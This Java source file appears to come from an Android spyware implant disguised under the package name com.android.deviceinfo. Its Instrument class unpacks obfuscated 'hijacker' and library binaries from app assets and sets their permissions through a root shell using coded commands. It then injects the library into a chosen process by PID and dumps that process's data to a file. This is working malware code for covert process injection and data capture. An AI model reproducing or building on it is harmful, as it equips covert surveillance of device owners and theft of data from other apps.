package com.android.deviceinfo.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import com.android.deviceinfo.Root;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;

public class Instrument {
	private static final String TAG = "Instrument";
	private String proc;
	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
	
	public Instrument(String process, String dump) {
		final File filesPath = Status.getAppContext().getFilesDir();
		
		proc = process;
		
		hijacker = "m";
		lib = "n";
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		pidFile = "irg";
		pidCompletePath = path + "/" + pidFile;
	}
	
	public boolean installHijacker() {
		InputStream stream = Utils.getAssetStream("i.bin"); // libt.so

		try {
			// Install library
			Root.fileWrite(lib, stream, Cfg.RNDDB);
			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + path + "/" + lib);
			
			// copy_remount libt.so to /system/lib/
			//Execute.execute(Configuration.shellFile + " " + "fhs" + " " + "/system" + " " + path + "/" + lib + " " + "/system/lib/" + lib);
			
			stream.close();
			
			// Unpack the Hijacker
			stream = Utils.getAssetStream("m.bin"); // Hijacker
			
			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
			Runtime.getRuntime().exec(Configuration.shellFile + " " + "pzm" + " " + "750" + " " + path + "/" + hijacker);
			
			stream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
			
			return false;
		}
		
		
		//File file = new File(Status.getAppContext().getFilesDir(), lib);
		//file.delete();
		
		return true;
	}
	
	public void startInstrumentation() {
		int pid = getProcessPid();
		
		if (pid > 0) {
			Execute.executeRoot("\"" + path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + " -d\"");
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getProcessPid): unable to get pid");
			}
		}
	}
	
	private int getProcessPid() {
		int pid;
		byte[] buf = new byte[4];
		
		Execute.execute(Configuration.shellFile + " " + "lid" + " " + proc + " " + pidCompletePath);
		
		try {
			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);
			
			fis.read(buf);
			fis.close();
			
			// Remove PID file
			File f = new File(pidCompletePath);			
			f.delete();
			
			// Parse PID from the file
			ByteBuffer bbuf = ByteBuffer.wrap(buf);
			bbuf.order(ByteOrder.LITTLE_ENDIAN);
			pid = bbuf.getInt();
		} catch (IOException e) {
		   if (Cfg.EXCEPTION) {
			   Check.log(e);
		   }
		   
		   return 0;
		}
		
		return pid;
	}
}
